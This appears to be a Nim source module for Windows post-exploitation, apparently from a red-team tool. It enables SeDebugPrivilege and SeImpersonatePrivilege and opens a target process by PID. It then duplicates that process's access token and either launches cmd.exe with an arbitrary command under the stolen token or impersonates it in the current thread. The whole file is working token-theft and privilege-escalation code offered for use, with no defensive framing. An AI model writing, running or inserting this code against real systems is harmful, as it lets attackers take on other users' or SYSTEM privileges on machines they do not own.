import winim/lean
import std/strformat
import os
import strutils
import system
import winim/inc/lm


proc SetPrivilege(lpszPrivilege:string): bool=
    var tp : TOKEN_PRIVILEGES
    var luid: LUID 
    var HTtoken: HANDLE
    discard OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &HTtoken)
    if LookupPrivilegeValue(NULL, lpszPrivilege, &luid) == 0:
        return false
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    if AdjustTokenPrivileges(HTtoken, FALSE, &tp, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), NULL, NULL) == 0:
        return false
    return true

proc GetUser():string =
    var
        buffer = newString(UNLEN + 1)
        cb = DWORD buffer.len
    GetUserNameA(&buffer, &cb)
    buffer.setLen(cb - 1)
    return buffer

proc SpawnProcessToken(PID: int,cmdtorun: string): int =


    if not SetPrivilege("SeDebugPrivilege"):
        quit()

    var cmd = fmt"C:\Windows\System32\cmd.exe /Q /c {cmdtorun}"

    var getproresult = OpenProcess(PROCESS_ALL_ACCESS,TRUE,PID.DWORD)
    if getproresult == 0:
        return 1
    defer: CloseHandle(getproresult)

    var prochand:  HANDLE
    var resultbool = OpenProcessToken(getproresult, MAXIMUM_ALLOWED, addr prochand) 
    if resultbool == FALSE:
        return 1
    


    var newtoken: HANDLE
    var dupresult = DuplicateTokenEx(prochand,MAXIMUM_ALLOWED,nil,3, 1, addr newToken)
    if bool(dupresult) == FALSE:
        return 1
    
    var si: STARTUPINFO
    var pi: PROCESS_INFORMATION
    
    si.cb = sizeof(si).DWORD
    var promake = CreateProcessWithTokenW(newtoken,LOGON_WITH_PROFILE,nil,cmd,0,nil,NULL,addr si, addr pi)
    if bool(promake) == FALSE:
        return 1

    return 0

proc ImpersonateToken(PID: int):int=

    if not SetPrivilege("SeDebugPrivilege"):
        quit()
    if not SetPrivilege("SeImpersonatePrivilege"):
        quit()

    var getproresult = OpenProcess(PROCESS_ALL_ACCESS,TRUE,PID.DWORD)
    if getproresult == 0:
        return 1
    defer: CloseHandle(getproresult)

    var prochand:  HANDLE
    var resultbool = OpenProcessToken(getproresult, MAXIMUM_ALLOWED, addr prochand) 
    if resultbool == FALSE:
        return 1
    


    var newtoken: HANDLE
    var dupresult = DuplicateTokenEx(prochand,MAXIMUM_ALLOWED,nil,2, 2, addr newToken)
    if bool(dupresult) == FALSE:
        return 1

    ImpersonateLoggedOnUser(newtoken)
    return 0

func reverttoken():int=
    RevertToSelf()
    return 0
